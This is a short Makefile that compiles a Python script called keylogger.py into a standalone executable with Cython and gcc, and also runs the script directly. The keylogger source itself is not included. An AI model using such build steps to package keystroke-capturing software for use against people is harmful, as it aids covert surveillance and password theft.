all:
	cython --embed -o keylogger.c keylogger.py
	gcc -Os -I /usr/include/python3.8/ keylogger.c -lpython3.8 -o keylogger
run:
	python3 keylogger.py

